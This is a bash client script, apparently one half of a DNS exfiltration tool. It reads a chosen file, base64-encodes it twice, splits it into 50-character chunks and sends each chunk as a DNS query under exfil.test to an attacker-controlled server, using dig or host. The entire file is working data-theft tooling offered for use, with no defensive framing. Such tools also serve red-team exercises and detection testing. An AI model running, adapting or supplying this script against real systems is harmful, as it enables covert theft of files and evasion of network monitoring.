#!/bin/bash

USAGE='Usage : ./client.sh <file_to_exfiltrate> <dns_ip> <dns_port>'
IPV4_REGEX="^((25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])$"

FILE=$1
SERVER=$2
PORT=$3
DOM="exfil.test"
DIG_AVAILABLE=1
HOST_AVAILABLE=2
NO_BINARY_AVAILABLE=3

exit_and_print_usage() {
    echo $USAGE
    exit 1
}

check_arguments() {
    if [[ ! -f "$FILE" ]]; then
        echo "File $FILE does not exist."
        exit_and_print_usage
    fi

    if [[ -z $SERVER ]]; then
        echo 'Server address is missing.'
        exit_and_print_usage
    elif [[ ! $SERVER =~ $IPV4_REGEX ]]; then
        echo 'Invalid IPv4 format'
        exit_and_print_usage
    fi

    if [[ -z $PORT ]]; then
        echo "Port is missing."
        exit_and_print_usage
    elif [[ ! "$PORT" =~ ^[0-9]+$ ]] || (( PORT < 1 || PORT > 65535 )); then
        echo "Invalid port number."
        exit_and_print_usage
    fi
}

check_available_binaries() {
    # exit(1): 'dig' available
    # exit(2): 'host' available
    # exit(3): no one available
    if command -v dig 2>&1 >/dev/null;
    then
        echo "Found dig, using it for exfiltration."
        return $DIG_AVAILABLE
    elif command -v host 2>&1 >/dev/null;
    then
        echo "Found host, using it for exfiltration."
        return $HOST_AVAILABLE
    fi
    return $NO_BINARY_AVAILABLE
}

dns_exfil() {
    local chunk=$1
    local binary_choice=$2

    if [[ $binary_choice -eq $DIG_AVAILABLE ]];
    then
        dig +short +time=1 +tries=1 -p "$PORT" @"$SERVER" "$chunk.$DOM" > /dev/null 2>&1
    else
        host -W 0 -p "$PORT" "$chunk.$DOM" "$SERVER" > /dev/null 2>&1
    fi
    echo -n "."

}
exfiltrate_file() {
    local binary_choice=$1
    # Double encoding avoid special chars
    # See https://developers.google.com/maps/url-encoding#special-characters
    local BASE64_CONTENT=$(cat $FILE | base64 -w0 | base64 -w0)
    local CHUNK_SIZE=50
    local len=${#BASE64_CONTENT}

    # Send filename
    dns_exfil "$FILE" "$binary_choice"
    
    # Send file content
    for (( i=0; i<$len; i+=$CHUNK_SIZE )); do
        local chunk=${BASE64_CONTENT:$i:$CHUNK_SIZE}
        dns_exfil "$chunk" "$binary_choice"
    done

    # Send end of transmission
    dns_exfil "end" "$binary_choice"

    echo "File successfully exfiltrated."
}

main() {
    check_arguments
    check_available_binaries
    
    local binary_choice=$?
    if [[ $binary_choice -eq $NO_BINARY_AVAILABLE ]];
    then
        echo 'Dig and host binaries not found.'
        exit 1
    fi
    
    exfiltrate_file $binary_choice
}

main
